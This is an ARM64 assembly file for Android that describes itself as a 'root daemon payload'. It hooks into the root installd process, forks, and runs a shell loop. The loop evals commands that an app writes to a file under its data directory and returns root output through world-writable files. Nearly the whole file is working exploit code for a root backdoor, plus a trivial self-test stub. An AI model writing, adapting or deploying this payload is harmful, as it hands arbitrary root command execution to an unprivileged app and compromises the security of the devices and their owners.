/*
 * P780 root daemon payload.
 *
 * Runs inside installd (uid 0, u:r:installd:s0) when the hook fires, forks once
 * and execs /system/bin/sh with a polling loop that turns /data/local/tmp/p780_cmd
 * into root shell output in /data/local/tmp/p780_out.
 *
 * Gate: uid 0 and /proc/self/cmdline contains "inst".
 */
    .text
    .global p780_stub_prod
    .type   p780_stub_prod, %function
    .balign 16
p780_stub_prod:
    stp     x0, x1, [sp, #-48]!
    stp     x2, x3, [sp, #16]
    stp     x29, x30, [sp, #32]

    mov     x8, #174
    svc     #0
    cbnz    x0, 9f

    sub     sp, sp, #64
    movn    x0, #99
    adr     x1, p_cmdline
    mov     x2, #0
    mov     x8, #56
    svc     #0
    tbnz    x0, #63, 8f
    mov     x9, x0
    mov     x0, x9
    mov     x1, sp
    mov     x2, #32
    mov     x8, #63
    svc     #0
    mov     x0, x9
    mov     x8, #57
    svc     #0

    mov     x12, #0
1:  add     x14, sp, x12
    ldr     w15, [x14]
    movz    w16, #0x6e69
    movk    w16, #0x7473, lsl #16
    cmp     w15, w16
    b.eq    2f
    add     x12, x12, #1
    cmp     x12, #29
    b.lt    1b
    b       8f
2:
    /* one-shot: only the first installd log spawns the daemon */
    movn    x0, #99
    adr     x1, p_lock
    movz    x2, #0x0c1
    movz    x3, #0x1a4
    mov     x8, #56
    svc     #0
    tbnz    x0, #63, 8f
    mov     x9, x0
    mov     x0, x9
    mov     x8, #57
    svc     #0

    mov     x0, #17
    mov     x1, #0
    mov     x2, #0
    mov     x3, #0
    mov     x4, #0
    mov     x8, #220
    svc     #0
    tbnz    x0, #63, 8f
    cbnz    x0, 8f

    sub     sp, sp, #256
    adr     x0, s_sh
    str     x0, [sp, #0]
    adr     x0, s_dashc
    str     x0, [sp, #8]
    adr     x0, s_script
    str     x0, [sp, #16]
    str     xzr, [sp, #24]
    adr     x0, s_env
    str     x0, [sp, #32]
    str     xzr, [sp, #40]

    adr     x0, s_sh
    mov     x1, sp
    add     x2, sp, #32
    mov     x8, #221
    svc     #0

    mov     x0, #0
    mov     x8, #93
    svc     #0

8:  add     sp, sp, #64
9:  ldp     x29, x30, [sp, #32]
    ldp     x2, x3, [sp, #16]
    ldp     x0, x1, [sp], #48

    .word   0xd503201f
    .word   0xd503201f
    .word   0xd503201f
    .word   0xd503201f

    .inst   0x90000009
    .inst   0x91000129
    .inst   0xd61f0120

    .balign 8
p_cmdline:
    .asciz  "/proc/self/cmdline"
p_lock:
    .asciz  "/data/user/0/top.dcmqht.p780ipsec/files/p780_lock"
s_sh:
    .asciz  "/system/bin/sh"
s_dashc:
    .asciz  "-c"
s_env:
    .asciz  "PATH=/system/bin"
s_script:
    .asciz  "umask 0; D=/data/user/0/top.dcmqht.p780ipsec/files; S=$D/p780_state; C=$D/p780_cmd; Q=$D/p780_seq; O=$D/p780_out; B=$D/p780_beat; echo READY > $S; chmod 666 $S; while :; do : > $B; if read -t 1 N < $Q; then if read -t 1 M < $C; then : > $Q; : > $C; if [ $M = __quit ]; then echo BYE > $S; break; fi; { eval $M; } > $O 2>&1; echo SEQ $N END >> $O; chmod 666 $O; fi; fi; done"

/* ---- self-test variant -------------------------------------------------- */
    .global p780_stub_test
    .type   p780_stub_test, %function
    .balign 16
p780_stub_test:
    stp     x0, x1, [sp, #-32]!
    stp     x2, x3, [sp, #16]
    movn    x0, #99
    adr     x1, p_test_path
    movz    x2, #0x441
    movz    x3, #0x1a4
    mov     x8, #56
    svc     #0
    tbnz    x0, #63, 5f
    mov     x9, x0
    mov     x0, x9
    adr     x1, p_test_msg
    mov     x2, #8
    mov     x8, #64
    svc     #0
    mov     x0, x9
    mov     x8, #57
    svc     #0
5:  ldp     x2, x3, [sp, #16]
    ldp     x0, x1, [sp], #32
    ret
p_test_path:
    .asciz  "/data/user/0/top.dcmqht.p780ipsec/cache/p780_stub_marker"
    .balign 8
p_test_msg:
    .ascii  "STUBTEST"
